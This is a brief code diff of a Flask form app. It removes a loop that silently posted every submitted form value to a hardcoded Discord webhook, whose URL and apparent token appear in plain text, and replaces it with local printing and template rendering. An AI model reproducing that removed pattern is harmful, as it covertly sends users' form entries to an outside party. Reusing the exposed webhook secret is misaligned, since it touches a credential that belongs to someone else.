@@ -1,14 +1,19 @@
-from flask import Flask, request, render_template
-import json
-import requests
+
+from flask import Flask, render_template, request
+
 app = Flask(__name__)
 
 @app.route("/", methods=['GET', 'POST'])
 def hello_world():
+    
+    
     if request.method == 'POST':
         a = request.form
-        for item, value in a.items():
-            requests.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
+        print(a['name'])
+        return render_template('base.html', a=a)
+    else:
+        return render_template('base.html', a=None)
+
     
-    return render_template('base.html')
+
 
